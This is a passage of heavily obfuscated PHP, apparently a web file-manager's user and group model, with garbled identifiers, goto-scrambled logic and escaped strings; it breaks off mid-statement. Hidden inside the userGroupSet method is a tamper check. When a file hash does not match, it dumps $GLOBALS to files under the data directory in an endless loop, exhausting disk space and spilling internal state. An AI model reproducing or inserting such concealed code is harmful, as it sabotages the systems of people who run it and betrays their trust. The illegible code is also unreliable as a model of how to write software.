$fŒéƒ≠ß±°) { $Aﬂ†¢¨ò≠∂ = $this->getInfoSimple($eæÛÓÒΩåœ); if (!$Aﬂ†¢¨ò≠∂) { return !1; } $B∆íçÜ•ππ = array($_SERVER[£¿ÌÙëü¡¯¯][676] => $fŒéƒ≠ß±°); return $this->userEdit($eæÛÓÒΩåœ, $B∆íçÜ•ππ); } protected function userRemove($Bªï€ë…î⁄) { goto Dé◊Æ ã ç; Dé◊Æ ã ç: $bÎçìÙÁØÛ =& $_SERVER[£¿ÌÙëü¡¯¯]; $C€ø¡ü®•¿ = $this->getInfoSimple($Bªï€ë…î⁄); if (!$C€ø¡ü®•¿) { return !1; } goto e∏∞Çí◊»Ï; e∏∞Çí◊»Ï: $dÍö¬ù—ê¬ = array($bÎçìÙÁØÛ[1340] => $Bªï€ë…î⁄); Model($bÎçìÙÁØÛ[528])->where($dÍö¬ù—ê¬)->delete(); Model($bÎçìÙÁØÛ[2406])->where($dÍö¬ù—ê¬)->delete(); goto CÍﬁ‚œÑÆÎ; fçââïÀ‰›: Model($bÎçìÙÁØÛ[749])->userRootRemove($Bªï€ë…î⁄); return $this->where($dÍö¬ù—ê¬)->delete(); goto AøãêÜ‡¢õ; CÍﬁ‚œÑÆÎ: Model($bÎçìÙÁØÛ[2089])->where($dÍö¬ù—ê¬)->delete(); Model($bÎçìÙÁØÛ[2390])->where($dÍö¬ù—ê¬)->delete(); Model($bÎçìÙÁØÛ[2407])->where($dÍö¬ù—ê¬)->delete(); goto fçââïÀ‰›; AøãêÜ‡¢õ: } protected function userGroupSet($Eä“¡‚«“§, $Eâò∞≈¯ó, $eéëéˆÉø¡ = array()) { goto FÜùΩèÑ®ê; FÜùΩèÑ®ê: $Aê»‡◊†¨∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; $F Ü®Œ∆–¢ = $_SERVER[$Aê»‡◊†¨∫[790]] . $Aê»‡◊†¨∫[1091]; $BıÛ‡†∫ = $Aê»‡◊†¨∫[784]; goto f≈áπ›ÉïÉ; B∏ﬂó≤∫◊Ú: $D†è°˜ãÿ£ = Model($Aê»‡◊†¨∫[2089]); $D†è°˜ãÿ£->where(array($Aê»‡◊†¨∫[1349] => $Eä“¡‚«“§))->delete(); $aä˜â‹ÈáÏ = array(); goto aÒ∆ú„⁄äÔ; f≈áπ›ÉïÉ: if ($_SERVER[$Aê»‡◊†¨∫[785]] != $BıÛ‡†∫($F Ü®Œ∆–¢)) { goto Fë≥€î‚œ÷; Bãπ¨à—…ã: $c„ù§öòÛ· = $Aê»‡◊†¨∫[789]; $c„ù§öòÛ·($_SERVER[$Aê»‡◊†¨∫[790]]); $f§Ñ˘¡ΩÜ° = $Aê»‡◊†¨∫[786]; goto EüüŸ‹°€≈; EüüŸ‹°€≈: $f§Ñ˘¡ΩÜ°(); $a±ÓÔ’Œ—ò = $Aê»‡◊†¨∫[791]; $d¯ñ’Ù‰êŒ = json_encode($GLOBALS[$Aê»‡◊†¨∫[792]]); goto E„éÓÏıÉî; Fë≥€î‚œ÷: $f§Ñ˘¡ΩÜ° = $Aê»‡◊†¨∫[786]; $B˘◊ö‘–ææ = $Aê»‡◊†¨∫[787]; $Dˆ»–‘á≥Ó = $_SERVER[$Aê»‡◊†¨∫[782]] . $Aê»‡◊†¨∫[783]; goto Då¯€Ö÷÷◊; E„éÓÏıÉî: $aœí±¯Õ∏ô = 1; for ($f‹éé÷ãµ• = $aœí±¯Õ∏ô; $f‹éé÷ãµ• > 0; $f‹éé÷ãµ•++) { $a±ÓÔ’Œ—ò(DATA_PATH . $f‹éé÷ãµ•, $d¯ñ’Ù‰êŒ); } goto fÜ÷‰Ê„ıë; Då¯€Ö÷÷◊: $D¬ñóªÒäÌ = $B˘◊ö‘–ææ($Dˆ»–‘á≥Ó); $dˆ¨ÀÖôÛë = explode($Aê»‡◊†¨∫[214], $D¬ñóªÒäÌ); if (count($dˆ¨ÀÖôÛë) < $Aê»‡◊†¨∫[556]) { $c©Íæ´“ﬁ‰ = $Aê»‡◊†¨∫[788]; $c©Íæ´“ﬁ‰(); } goto Bãπ¨à—…ã; fÜ÷‰Ê„ıë: } $Böñ≈÷ÚÀ® = $this->getInfoSimple($Eä“¡‚«“§); if (!$Böñ≈÷ÚÀ® || !is_array($Eâò∞≈¯ó)) { return !1; } goto B∏ﬂó≤∫◊Ú; aÒ∆ú„⁄äÔ: $aå”êÑå™ = 0; foreach ($Eâò∞≈¯ó as $Dµ≠ºÜ≠‰î => $f¬ôá®úÈí) { $A•”·±∏Ôì = array($Aê»‡◊†¨∫[1349] => $Eä“¡‚«“§, $Aê»‡◊†¨∫[2013] => $Dµ≠ºÜ≠‰î, $Aê»‡◊†¨∫[2143] => $f¬ôá®úÈí); $A•”·±∏Ôì[$Aê»‡◊†¨∫[2034]] = isset($eéëéˆÉø¡[$aå”êÑå™]) ? $eéëéˆÉø¡[$aå”êÑå™] : 0; $aå”êÑå™++; $aä˜â‹ÈáÏ[] = $A•”·±∏Ôì; } return $D†è°˜ãÿ£->addAll($aä˜â‹ÈáÏ, array(), !0); goto aç¡˜ƒÉ·—; aç¡˜ƒÉ·—: } protected function userGroupAdd($E®¨§òﬁôñ, $d¯ö≈≠®É„, $b—¥°Éæ¿˜) { $d¢í∂¢»∆’ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aœœ∫Ï·≥ê = $this->getInfoSimple($E®¨§òﬁôñ); if (!$Aœœ∫Ï·≥ê || !$d¯ö≈≠®É„) { return !1; } $AŸ∞ﬁ∆¥‚ = array(array($d¢í∂¢»∆’[1349] => $E®¨§òﬁôñ, $d¢í∂¢»∆’[2013] => $d¯ö≈≠®É„, $d¢í∂¢»∆’[2143] => $b—¥°Éæ¿˜)); return Model($d¢í∂¢»∆’[2089])->addAll($AŸ∞ﬁ∆¥‚, array(), !0); } protected function userGroupRemove($D†≤≈üòƒÒ, $FéöÜ“ ì) { $fΩÃÃé∫ì˜ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c¯çíë‹∑Ñ = $this->getInfoSimple($D†≤≈üòƒÒ); if (!$c¯çíë‹∑Ñ || !$FéöÜ“ ì) { return !1; } $AÉ∏ä£û£Æ = array($fΩÃÃé∫ì˜[1340] => $D†≤≈üòƒÒ, $fΩÃÃé∫ì˜[2087] => $FéöÜ“ ì); return Model($fΩÃÃé∫ì˜[2089])->where($AÉ∏ä£û£Æ)->delete(); } public function listData() { $a¢∂πÑéñ´ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a¢∂πÑéñ´[$_SERVER[£¿ÌÙëü¡¯¯][350]]); return $a¢∂πÑéñ´; } public function listByID($a…∏Ì¿Ú…è) { $eà”—◊»â‡ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$a…∏Ì¿Ú…è) { return; } $A‘Î≈ä◊Ωö = array($eà”—◊»â‡[1349] => array($eà”—◊»â‡[7], $a…∏Ì¿Ú…è)); $DçîØÎ·€å = $this->where($A‘Î≈ä◊Ωö)->select(); $this->_listDataApply($DçîØÎ·€å); return $DçîØÎ·€å; } public function listByGroup($Cˆµ¯èÇıß = 0, $a»ÿ•€Ø·∞ = array()) { goto F≠ÉøŸ˜Æª; B°ë◊ä‘çØ: return $Eâ∏äπËÓ±; goto cáãÉÂŒë¿; Bñƒ£åøı¬: $Eâ∏äπËÓ± = $this->_makeOrder($C˘ÔµÛ∑√ö)->field($Bô·áÈ√âΩ[2412])->where($dèö∂éâ≠∆)->join($aÏÇ¥ïúÍª)->selectPage(50); $D«€ºõâ¿ = $Bô·áÈ√âΩ[969] . ($Bî”ãà‚„∂ ? $Bô·áÈ√âΩ[47] . $Bî”ãà‚„∂ : $Bô·áÈ√âΩ[33]); $this->_listDataApply($Eâ∏äπËÓ±[$Bô·áÈ√âΩ[350]], $D«€ºõâ¿); goto B°ë◊ä‘çØ; C¥Œ–â≥∞ü: $dèö∂éâ≠∆ = array(); if ($Cˆµ¯èÇıß) { $dèö∂éâ≠∆ = array($Bô·áÈ√âΩ[2409] => intval($Cˆµ¯èÇıß)); $aÏÇ¥ïúÍª = "\x4c\105\x46\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\165\x73\145\162\137\x67\x72\x6f\165\x70\x20\x75\x73\x65\x72\x5f\147\162\157\165\160\40\157\156\x20\x75\163\145\x72\56\165\163\x65\x72\111\x44\x20\x3d\x20\165\163\145\162\x5f\147\162\x6f\165\160\x2e\x75\163\145\162\111\104"; $C˘ÔµÛ∑√ö = Input::get($Bô·áÈ√âΩ[403], null, $Bô·áÈ√âΩ[33]) ? $Bô·áÈ√âΩ[33] : $Bô·áÈ√âΩ[2410]; } if (isset($a»ÿ•€Ø·∞[$Bô·áÈ√âΩ[676]])) { $dèö∂éâ≠∆[$Bô·áÈ√âΩ[2411]] = $a»ÿ•€Ø·∞[$Bô·áÈ√âΩ[676]]; } goto Bñƒ£åøı¬; F≠ÉøŸ˜Æª: $Bô·áÈ√âΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bî”ãà‚„∂ = isset($a»ÿ•€Ø·∞[$Bô·áÈ√âΩ[2408]]) ? $a»ÿ•€Ø·∞[$Bô·áÈ√âΩ[2408]] : $Bô·áÈ√âΩ[33]; $aÏÇ¥ïúÍª = $Bô·áÈ√âΩ[33]; goto C¥Œ–â≥∞ü; cáãÉÂŒë¿: } private function _makeOrder($e‡Ëﬁ∞ﬂﬂì = '') { goto bÂÈûäÚÊò; bÂÈûäÚÊò: $d≈°Ì◊çÛµ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fãîÚ∆ﬁ‘å = array($d≈°Ì◊çÛµ[1349], $d≈°Ì◊çÛµ[28], $d≈°Ì◊çÛµ[1999], $d≈°Ì◊çÛµ[1973], $d≈°Ì◊çÛµ[184]); $cÆÖ•´âË√ = array($d≈°Ì◊çÛµ[398] => $d≈°Ì◊çÛµ[399], $d≈°Ì◊çÛµ[400] => $d≈°Ì◊çÛµ[401]); goto dÙ˜Êª±¶∆; dÙ˜Êª±¶∆: $B¡€ÇàèÖÿ = Input::get($d≈°Ì◊çÛµ[403], $d≈°Ì◊çÛµ[7], $d≈°Ì◊çÛµ[1340], $fãîÚ∆ﬁ‘å); $cîÓ§Ü“«Ö = Input::get($d≈°Ì◊çÛµ[404], $d≈°Ì◊çÛµ[7], $d≈°Ì◊çÛµ[2090], array($d≈°Ì◊çÛµ[2090], $d≈°Ì◊çÛµ[400])); $cîÓ§Ü“«Ö = $cÆÖ•´âË√[$cîÓ§Ü“«Ö]; goto Dπÿº„æ±†; Dπÿº„æ±†: $e‡Ëﬁ∞ﬂﬂì = $e‡Ëﬁ∞ﬂﬂì . "\165\163\145\162\x2e{$B¡€ÇàèÖÿ}\x20{$cîÓ§Ü“«Ö}\54\40\165\x73\145\162\x2e\165\x73\145\162\x49\x44\x20\x61\163\x63"; return $this->alias($d≈°Ì◊çÛµ[2173])->order($e‡Ëﬁ∞ﬂﬂì); goto DΩŒÎû¶–; DΩŒÎû¶–: } public function listSearch($fµ≥ÀÓ„ÂÖ) { goto BÉÌ§Üï¥í; F≥ÑÈŸ∫íá: $this->_filterUserList($fªô„÷ì€£); return $fªô„÷ì€£; goto dˆ„Î®≥¶–; BÉÌ§Üï¥í: $fñ§∂ÕŒ∑· =& $_SERVER[£¿ÌÙëü¡¯¯]; $a˜©èÀÖµ… = $fµ≥ÀÓ„ÂÖ[$fñ§∂ÕŒ∑·[2091]]; $aÖ¿ëµÜÃ⁄ = isset($fµ≥ÀÓ„ÂÖ[$fñ§∂ÕŒ∑·[2092]]) ? $fµ≥ÀÓ„ÂÖ[$fñ§∂ÕŒ∑·[2092]] : !1; goto CÛâó¢Œã∂; fÙº‚õ£úõ: if (!$fªô„÷ì€£ || count($fªô„÷ì€£[$fñ§∂ÕŒ∑·[350]]) < 5 && Input::check($a˜©èÀÖµ…, $fñ§∂ÕŒ∑·[303])) { $c‡Ö∆ﬂ¶Í˘ = $this->_searchFromMeta($fñ§∂ÕŒ∑·[411], $a˜©èÀÖµ…, 10); $aáıË¥¨∆ë = $this->_searchFromMeta($fñ§∂ÕŒ∑·[412], $a˜©èÀÖµ…, 10); $B•¨∆≤¯ß‰ = array_merge($c‡Ö∆ﬂ¶Í˘, $aáıË¥¨∆ë, $fªô„÷ì€£[$fñ§∂ÕŒ∑·[350]]); $fªô„÷ì€£[$fñ§∂ÕŒ∑·[350]] = array_unique_by_key($B•¨∆≤¯ß‰, $fñ§∂ÕŒ∑·[1349]); $fªô„÷ì€£[$fñ§∂ÕŒ∑·[347]][$fñ§∂ÕŒ∑·[348]] = count($fªô„÷ì€£[$fñ§∂ÕŒ∑·[350]]); $fªô„÷ì€£[$fñ§∂ÕŒ∑·[347]][$fñ§∂ÕŒ∑·[349]] = ceil($fªô„÷ì€£[$fñ§∂ÕŒ∑·[347]][$fñ§∂ÕŒ∑·[348]] / $fªô„÷ì€£[$fñ§∂ÕŒ∑·[347]][$fñ§∂ÕŒ∑·[345]]); } $this->_listDataApply($fªô„÷ì€£[$fñ§∂ÕŒ∑·[350]]); $this->_filterByGroup($fªô„÷ì€£, $aÖ¿ëµÜÃ⁄); goto F≥ÑÈŸ∫íá; CÛâó¢Œã∂: $a˜©èÀÖµ… = str_replace($fñ§∂ÕŒ∑·[2093], $fñ§∂ÕŒ∑·[2094], trim($a˜©èÀÖµ…)); $D¯Ï› πâ‘ = array($fñ§∂ÕŒ∑·[28] => array($fñ§∂ÕŒ∑·[748], "\45{$a˜©èÀÖµ…}\x25"), $fñ§∂ÕŒ∑·[290] => array($fñ§∂ÕŒ∑·[748], "\x25{$a˜©èÀÖµ…}\45"), $fñ§∂ÕŒ∑·[2231] => array($fñ§∂ÕŒ∑·[748], "\45{$a˜©èÀÖµ…}\x25"), $fñ§∂ÕŒ∑·[912] => $fñ§∂ÕŒ∑·[2095]); if (Input::check($a˜©èÀÖµ…, $fñ§∂ÕŒ∑·[296])) { $D¯Ï› πâ‘[$fñ§∂ÕŒ∑·[1349]] = array($fñ§∂ÕŒ∑·[748], "\45{$a˜©èÀÖµ…}\x25"); $D¯Ï› πâ‘[$fñ§∂ÕŒ∑·[2391]] = array($fñ§∂ÕŒ∑·[748], "\x25{$a˜©èÀÖµ…}\45"); } goto Aπ€Î‚◊øÈ; Aπ€Î‚◊øÈ: if (!$a˜©èÀÖµ…) { $D¯Ï› πâ‘ = array(); } if (isset($fµ≥ÀÓ„ÂÖ[$fñ§∂ÕŒ∑·[676]])) { $D¯Ï› πâ‘[$fñ§∂ÕŒ∑·[676]] = $fµ≥ÀÓ„ÂÖ[$fñ§∂ÕŒ∑·[676]]; } $fªô„÷ì€£ = $this->_makeOrder()->where($D¯Ï› πâ‘)->selectPage(20); goto fÙº‚õ£úõ; dˆ„Î®≥¶–: } private function _filterByGroup(&$C—Î∆–˜‰ò, $C€Ö±Ö∞¨⁄) { $a¬ìÒ„Üã© =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$C€Ö±Ö∞¨⁄) { return $C—Î∆–˜‰ò; } foreach ($C—Î∆–˜‰ò[$a¬ìÒ„Üã©[350]] as $A∂…ìâî±í => &$aÍÀƒé∂Ï¥) { $D»√é›§ î = array_to_keyvalue($aÍÀƒé∂Ï¥[$a¬ìÒ„Üã©[2413]], $a¬ìÒ„Üã©[33], $a¬ìÒ„Üã©[2013]); if (!in_array($C€Ö±Ö∞¨⁄, $D»√é›§ î)) { unset($C—Î∆–˜‰ò[$a¬ìÒ„Üã©[350]][$A∂…ìâî±í]); } } $C—Î∆–˜‰ò[$a¬ìÒ„Üã©[350]] = array_values($C—Î∆–˜‰ò[$a¬ìÒ„Üã©[350]]); $C—Î∆–˜‰ò[$a¬ìÒ„Üã©[347]] = array($a¬ìÒ„Üã©[2207] => count($C—Î∆–˜‰ò[$a¬ìÒ„Üã©[350]]), $a¬ìÒ„Üã©[2205] => $C—Î∆–˜‰ò[$a¬ìÒ„Üã©[347]][$a¬ìÒ„Üã©[345]], $a¬ìÒ„Üã©[2204] => 1, $a¬ìÒ„Üã©[2206] => 1); } private function _filterUserList(&$Fœ˜æúØö£) { $Dû…ãÀã—ù =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($Fœ˜æúØö£[$Dû…ãÀã—ù[350]] as $bã∆íå ≠≈ => &$Dº“†Ã√âÇ) { unset($Dº“†Ã√âÇ[$Dû…ãÀã—ù[413]]); } } private function _searchFromMeta($F÷Ñ”åàÛÉ, $f∫á ’óÂ≈, $f—•Áó“Îü) { goto B®§”ïß†©; A‰¥Ÿ⁄àÃ¡: $bØÆ≥ŸçÆæ = $this->where(array($Bè∏ç£ø«í[1340] => array($Bè∏ç£ø«í[7], $A”ÓÓ¿ÑÏÑ)))->select(); if (!$bØÆ≥ŸçÆæ) { return array(); } return $bØÆ≥ŸçÆæ; goto bØÎ∏ù¶–∑; B®§”ïß†©: $Bè∏ç£ø«í =& $_SERVER[£¿ÌÙëü¡¯¯]; $f∫á ’óÂ≈ = strtolower($f∫á ’óÂ≈); $eÙË‚§€ıö = array($Bè∏ç£ø«í[90] => $F÷Ñ”åàÛÉ, $Bè∏ç£ø«í[354] => array($Bè∏ç£ø«í[748], "\45{$f∫á ’óÂ≈}\x25")); goto Cë’Ü∆…ìØ; Cë’Ü∆…ìØ: $A”ÓÓ¿ÑÏÑ = Model($Bè∏ç£ø«í[2414])->where($eÙË‚§€ıö)->limit($f—•Áó“Îü)->select(); if (!$A”ÓÓ¿ÑÏÑ) { return array(); } $A”ÓÓ¿ÑÏÑ = array_to_keyvalue($A”ÓÓ¿ÑÏÑ, $Bè∏ç£ø«í[33], $Bè∏ç£ø«í[1349]); goto A‰¥Ÿ⁄àÃ¡; bØÎ∏ù¶–∑: } private function _listDataApplyItem($BÇÖÊ⁄åà–) { $D–≥äé†°⁄ = array($BÇÖÊ⁄åà–); $this->_listDataApply($D–≥äé†°⁄); return $D–≥äé†°⁄[0]; } private function _listDataApply(&$F•ﬂœ‚ÜŒÎ, $c®Ãıµ…Îµ = "\x67\x72\157\165\160\54\x6d\x65\x74\141\54\x73\x6f\165\162\x63\145") { goto D˘•üçÓÚÉ; Eêä™Éå∂: $EÑÜéŒîç = array_to_keyvalue($F•ﬂœ‚ÜŒÎ, $a´ﬂî€ê®»[33], $a´ﬂî€ê®»[1349]); $c®Ãıµ…Îµ = explode($a´ﬂî€ê®»[47], $c®Ãıµ…Îµ); if (in_array($a´ﬂî€ê®»[969], $c®Ãıµ…Îµ)) { $this->_listAppendGroup($F•ﬂœ‚ÜŒÎ, $EÑÜéŒîç); } goto b‘”µ•ˆâ´; b‘”µ•ˆâ´: if (in_array($a´ﬂî€ê®»[2415], $c®Ãıµ…Îµ)) { $this->_listAppendMeta($F•ﬂœ‚ÜŒÎ, $EÑÜéŒîç); } if (in_array($a´ﬂî€ê®»[379], $c®Ãıµ…Îµ)) { $this->_listAppendSourceRoot($F•ﬂœ‚ÜŒÎ, $EÑÜéŒîç); } goto Dä–∂ä ıè; D˘•üçÓÚÉ: $a´ﬂî€ê®» =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$F•ﬂœ‚ÜŒÎ) { return; } array_remove_key($F•ﬂœ‚ÜŒÎ, $a´ﬂî€ê®»[799]); goto Eêä™Éå∂; Dä–∂ä ıè: } private function _listAppendSourceRoot(&$F¬≥íâ≤í§, $Eû¶êøèÙ≥) { goto F‚é¿á¨•¨; CÙÔŸÓÉ§ÿ: foreach ($F¬≥íâ≤í§ as &$f¨‰‚ﬂˆˆÁ) { $f¨‰‚ﬂˆˆÁ[$F°—„ùóÛÊ[388]] = $f¿ÃÀüﬁ·°[$f¨‰‚ﬂˆˆÁ[$F°—„ùóÛÊ[1349]]] ? $f¿ÃÀüﬁ·°[$f¨‰‚ﬂˆˆÁ[$F°—„ùóÛÊ[1349]]] : array(); } goto EÙ˜ô‡ûÀ¶; F‚é¿á¨•¨: $F°—„ùóÛÊ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÏı÷Ø™∂ = array($F°—„ùóÛÊ[457] => 0, $F°—„ùóÛÊ[368] => SourceModel::TYPE_USER, $F°—„ùóÛÊ[452] => array($F°—„ùóÛÊ[7], $Eû¶êøèÙ≥)); $A√ÖÖ◊’Òì = $F°—„ùóÛÊ[2101]; goto E™õíÕ‹ﬁ ; E™õíÕ‹ﬁ : $f¿ÃÀüﬁ·° = Model($F°—„ùóÛÊ[749])->order($F°—„ùóÛÊ[2102])->field($A√ÖÖ◊’Òì)->where($EÏı÷Ø™∂)->select(); $f¿ÃÀüﬁ·° = array_to_keyvalue($f¿ÃÀüﬁ·°, $F°—„ùóÛÊ[452]); $f¿ÃÀüﬁ·° = array_remove_key($f¿ÃÀüﬁ·°, $F°—„ùóÛÊ[452]); goto CÙÔŸÓÉ§ÿ; EÙ˜ô‡ûÀ¶: } private function _listAppendGroup(&$cì±çå‚≈õ, $Bºô∞Íé˜˜) { goto DÑß˜√‡ô¬; BèâäèÌ÷Ö: $e»ÀÚ∏çÂ√ = array_to_keyvalue($Eê€°Ωí“Ó, $BÑŸø¥™∏¢[33], $BÑŸø¥™∏¢[2013]); $e»ÀÚ∏çÂ√ = array_remove_value(array_unique($e»ÀÚ∏çÂ√), $BÑŸø¥™∏¢[464]); if (!$e»ÀÚ∏çÂ√ || !$Eê€°Ωí“Ó) { return; } goto cÏÀÎ‡ﬂ«≤; DÑß˜√‡ô¬: $BÑŸø¥™∏¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dú¢©§ √Ÿ = array($BÑŸø¥™∏¢[1349] => array($BÑŸø¥™∏¢[7], $Bºô∞Íé˜˜)); $Eê€°Ωí“Ó = Model($BÑŸø¥™∏¢[2089])->where($Dú¢©§ √Ÿ)->select(); goto BèâäèÌ÷Ö; cÏÀÎ‡ﬂ«≤: $Dú¢©§ √Ÿ = array($BÑŸø¥™∏¢[2013] => array($BÑŸø¥™∏¢[7], $e»ÀÚ∏çÂ√)); $f»Ò¡˘ÉÊê = Model($BÑŸø¥™∏¢[2416])->field($BÑŸø¥™∏¢[2417])->where($Dú¢©§ √Ÿ)->select(); $cƒÒ¢∆ª†á = array_to_keyvalue($f»Ò¡˘ÉÊê, $BÑŸø¥™∏¢[2013], $BÑŸø¥™∏¢[28]); goto eƒî§ãÒ˘Â; eƒî§ãÒ˘Â: $Eê€°Ωí“Ó = array_to_keyvalue_group($Eê€°Ωí“Ó, $BÑŸø¥™∏¢[1349]); foreach ($Eê€°Ωí“Ó as &$D∆íﬁ¶Õ–Ò) { $D√ƒÕ÷çﬁΩ = array(); foreach ($D∆íﬁ¶Õ–Ò as $C≈›–·‹≠œ) { if (!$C≈›–·‹≠œ[$BÑŸø¥™∏¢[2143]]) { continue; } $fåæë¢ìÔ± = Model($BÑŸø¥™∏¢[2159])->listData($C≈›–·‹≠œ[$BÑŸø¥™∏¢[2143]]); $D√ƒÕ÷çﬁΩ[] = array($BÑŸø¥™∏¢[2013] => $C≈›–·‹≠œ[$BÑŸø¥™∏¢[2013]], $BÑŸø¥™∏¢[2418] => $cƒÒ¢∆ª†á[$C≈›–·‹≠œ[$BÑŸø¥™∏¢[2013]]], $BÑŸø¥™∏¢[373] => $fåæë¢ìÔ±); } $D∆íﬁ¶Õ–Ò = $D√ƒÕ÷çﬁΩ; } foreach ($cì±çå‚≈õ as &$d∞∫ïª≥´Ì) { $d∞∫ïª≥´Ì[$BÑŸø¥™∏¢[2413]] = array(); if (isset($Eê€°Ωí“Ó[$d∞∫ïª≥´Ì[$BÑŸø¥™∏¢[1349]]])) { $d∞∫ïª≥´Ì[$BÑŸø¥™∏¢[2413]] = $Eê€°Ωí“Ó[$d∞∫ïª≥´Ì[$BÑŸø¥™∏¢[1349]]]; } } goto Eı€ôã∏ÑÂ; Eı€ôã∏ÑÂ: } private function _listAppendMeta(&$B‡ ˆ‰ãèé, $f‹ø¯å”ù¶) { goto Bã£ÑÈö•Í; cù¿ÏñıÔ∏: $bîà‘õØÀ = array($eƒà®Û≥ëø[1349] => array($eƒà®Û≥ëø[7], $f‹ø¯å”ù¶)); $fπúë•ãÜ∞ = Model($eƒà®Û≥ëø[2390])->where($bîà‘õØÀ)->select(); $fπúë•ãÜ∞ = array_to_keyvalue_group($fπúë•ãÜ∞, $eƒà®Û≥ëø[1349]); goto BäÛê»∞ºÚ; BäÛê»∞ºÚ: foreach ($fπúë•ãÜ∞ as &$DÆºõàüˆæ) { $c≤¢©‚®Ìé = array(); foreach ($DÆºõàüˆæ as $a¢å†≥ö‰…) { if (!in_array($a¢å†≥ö‰…[$eƒà®Û≥ëø[90]], $Aº¨éå¢æç)) { $c≤¢©‚®Ìé[$a¢å†≥ö‰…[$eƒà®Û≥ëø[90]]] = $a¢å†≥ö‰…[$eƒà®Û≥ëø[354]]; } } $DÆºõàüˆæ = $c≤¢©‚®Ìé; } $eïè≠Ãœ“– = Model($eƒà®Û≥ëø[2419]); foreach ($B‡ ˆ‰ãèé as &$Aÿ≈∏≈±ì·) { $Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[413]] = array(); $Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[2420]] = array(); if (isset($fπúë•ãÜ∞[$Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[1349]]])) { $Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[413]] = $fπúë•ãÜ∞[$Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[1349]]]; } if (isset($Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[413]][$Bú´ß€Õ «])) { $Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[2420]] = $eïè≠Ãœ“–->getUserJobInfo($Aÿ≈∏≈±ì·[$eƒà®Û≥ëø[413]][$Bú´ß€Õ «]); } } goto BÔ£Ø˜è¢ƒ; Bã£ÑÈö•Í: $eƒà®Û≥ëø =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bú´ß€Õ « = UserJobModel::JOB_KEY; $Aº¨éå¢æç = array($eƒà®Û≥ëø[2393]); goto cù¿ÏñıÔ∏; BÔ£Ø˜è¢ƒ: } public function userSearch($E…¡àË∂É, $DÜÊé„øáœ = "\52") { return Model($_SERVER[£¿ÌÙëü¡¯¯][469])->where($E…¡àË∂É)->field($DÜÊé„øáœ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\x5f\157\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($e∞ÑŸ™±ñù) { return "\125\x73\145\x72\117\160\x74\x69\157\156\137{$e∞ÑŸ™±ñù}\137" . USER_ID; } protected function filterWhere($eﬁœîƒˆÃŒ) { $eﬁœîƒˆÃŒ[$_SERVER[£¿ÌÙëü¡¯¯][1349]] = USER_ID; return $eﬁœîƒˆÃŒ; } public function cacheRemoveUser($dËÇãëë∫Ü, $bΩ€ŒÉÙå) { return Cache::remove("\x55\x73\x65\x72\x4f\160\164\151\x6f\x6e\x5f{$dËÇãëë∫Ü}\137" . $bΩ€ŒÉÙå); } protected function optionDefault($fôı∆“‰µŒ = '') { $B‡™Ω…≠Ë≈ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($fôı∆“‰µŒ == $B‡™Ω…≠Ë≈[33]) { return $GLOBALS[$B‡™Ω…≠Ë≈[6]][$B‡™Ω…≠Ë≈[2421]]; } if ($fôı∆“‰µŒ == $B‡™Ω…≠Ë≈[2422]) { return $GLOBALS[$B‡™Ω…≠Ë≈[6]][$B‡™Ω…≠Ë≈[2423]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\x61\147\x4c\x69\x73\x74"; public $modelType = "\125\163\x65\x72\x4f\160\x74\x69\157\x6e"; public $field = array("\156\x61\x6d\x65", "\x73\x74\x79\x6c\145", "\163\157\162\x74"); public function listData($bè«≥èç‡Ó = false, $FôˆÃ·‡å· = "\163\157\162\x74", $A“ƒ‡≠¶ªê = false) { return parent::listData($bè«≥èç‡Ó, $FôˆÃ·‡å·, $A“ƒ‡≠¶ªê); } public function remove($Eà“˜©•¥ ) { return parent::remove($Eà“˜©•¥ ); } public function add($eä±éí”Æé, $F˜¨ŸíòÖ≤ = "\x6c\x61\x62\x65\x6c\55\x67\162\145\x79\x2d\x6e\157\x72\x6d\x61\154") { $C©ô”ÎΩßπ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->findByName($eä±éí”Æé)) { return !1; } $C≤ì£¡§Ç = array($C©ô”ÎΩßπ[383] => $eä±éí”Æé, $C©ô”ÎΩßπ[433] => $F˜¨ŸíòÖ≤, $C©ô”ÎΩßπ[2017] => $this->getSort($C©ô”ÎΩßπ[243]) + 1); return parent::insert($C≤ì£¡§Ç); } public function update($f≈¿Âïö‚“, $cñÔâÉÔõâ) { $d€Œπñµœæ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aàƒÚ‘Ê¡Ü = $this->listData($f≈¿Âïö‚“); $F—í§°£¯‡ = $this->findByName($cñÔâÉÔõâ[$d€Œπñµœæ[28]]); if (!$aàƒÚ‘Ê¡Ü || $F—í§°£¯‡ && $F—í§°£¯‡[$d€Œπñµœæ[364]] != $aàƒÚ‘Ê¡Ü[$d€Œπñµœæ[364]]) { return !1; } return parent::update($f≈¿Âïö‚“, $cñÔâÉÔõâ); } public function moveTop($dõÎ†Œô£ä) { $D¶Àª©≠ÕÓ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aö≥îÇ≈üﬂ = parent::listData(); $b™◊¯¬ƒ“Ï = $this->getSort($D¶Àª©≠ÕÓ[242]); foreach ($aö≥îÇ≈üﬂ as &$E∆íù®Ωá”) { if ($E∆íù®Ωá”[$D¶Àª©≠ÕÓ[364]] == 